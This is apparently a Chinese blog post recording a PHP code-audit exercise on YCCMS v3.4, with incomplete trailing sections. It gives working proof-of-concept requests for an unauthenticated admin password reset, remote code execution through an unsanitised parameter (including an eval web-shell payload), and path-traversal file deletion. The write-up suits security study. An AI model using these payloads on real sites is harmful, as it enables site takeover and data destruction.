---
title: php审计练习 yccms_v3.4
subtitle:
date: 2024-08-15T09:31:01+08:00
slug: 21
draft:  false
author: 
  name: 东隅
  link:
  email: 735587142
  avatar: 
description:
keywords:
license:
comment: false
weight: 0
tags:
  - 代码审计
  -  php安全
categories:
  - 代码审计
hiddenFromHomePage: false
hiddenFromSearch: false
hiddenFromRss: false
hiddenFromRelated: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: false
lightgallery: false
password:
message:
repost:
  enable: true
  url:

# See details front matter: https://fixit.lruihao.cn/documentation/content-management/introduction/#front-matter




---

<!--more-->

第一步仍然是搭好网站，这个网站还是很好搭的

后台 /admin

这个cms也是mvc架构

controller文件夹存放控制器文件,view文件夹存放视图文件,model文件夹存放数据文件



# 未授权修改admin密码

漏洞点在这里

![image-20230607120441111](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202306071204077.webp)

主要就是这里

```php
$this->_model->username=$_POST['username'];
$this->_model->password=sha1($_POST['password']);
$_edit=$this->_model->editAdmin();
```

该函数位于model\AdminModel.class.php

```php
public function editAdmin(){
        $_sql="UPDATE
                    my_admin
                SET
                    username='$this->username',
                    password='$this->password'
                WHERE
                    id=1
                LIMIT 1";
        return parent::update($_sql);
    }
```

他所在的类继承了这个类

```php
class AdminModel extends Model
```

跟进去看一下

位于model\Model.class.php，看一下update函数

```php
protected function update($_sql){
		return $this->execute($_sql)->rowCount();
	}
```

调用execute函数去执行sql语句

```php
protected function execute($_sql){
		try{
			$_stmt=$this->_db->prepare($_sql);
			$_stmt->execute();
		}catch (PDOException $e){
			exit('SQL语句:'.$_sql.'<br />错误信息:'.$e->getMessage());
		}
		return $_stmt;
	}
```

editAdmin函数直接把传进来的username password拼接到sql语句中，然后去更新相关表中id=1的数据，这也就造成了任意更改管理员账号密码

直接进行了信息更新，这一系列操作并没有对用户身份进行验证

poc

```http
POST /admin/?a=admin&m=update HTTP/1.1

username=admin&password=123456&notpassword=123456&send=%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81
```



# rce

poc

```
/admin/?a=Factory();phpinfo();//../
/admin/?a=Factory();@eval($_POST[1]);//../
```

让我来看看为什么

漏洞点在这个地方，他把这个$a没进行处理就拼接进去了，导致可以用;分隔开执行后面我想执行的代码，最后用//注释就好了

需要绕一下的就是这一句

```php
if (!file_exists(ROOT_PATH.'/controller/'.ucfirst($_a).'Action.class.php')) $_a = 'Login';
if (!file_exists(ROOT_PATH.'/controller/'.Factory();phpinfo();//../.'Action.class.php')) $_a = 'Login';
Factory();phpinfo();//../
```

绕过file_exists（）函数的验证，这个函数在进行检查会有一个bug，比如/controller/admin;/../，函数允许路径中有一些特殊字符，并且遇到/../会返回到上级目录，可以利用这个策略逃逸出 file_exists（）函数检查。
构造payload--->Factory();phpinfo();//../
Factory()是为了闭合eval中的new实例化，然后后面的是执行的命令语句，所以我们要找有生成Factory（）实例的文件/config/run.inc.php

ucfirst — 将字符串的首字母转换为大写，起不到啥作用

![image-20230608134304743](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202306081343731.webp)

调用流程如下

![image-20230608134734332](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202306081347646.webp)

> ps:autoload机制
>
> https://segmentfault.com/a/1190000006188247



# 任意文件删除1

漏洞点位于后台，未对用户身份进行校验，可未授权删除。

poc

```http
/admin?a=pic&m=delall

pid[0]=../test.txt&send=删除选中图片
```

test.txt位于根目录位置

调用顺序如下，可以看到这里可以目录穿越，可以从原本设计的upload文件夹穿越出来

![image-20230608225804950](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202306082258330.webp)





# 任意文件删除2

![image-20230609003240925](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202306090032307.webp)

第二处文件删除在controller/ArticleAction.class.php，查看代码如下，以get方法接收id参数，先连接数据库查找该id是否存在，若存在则删除该id所对应的文章，因此这里无法删除任意文件，只能删除文章

![image-20230609004035180](https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202306090040671.webp)



# 任意文件上传1



# 任意文件上传2





# 验证码复用







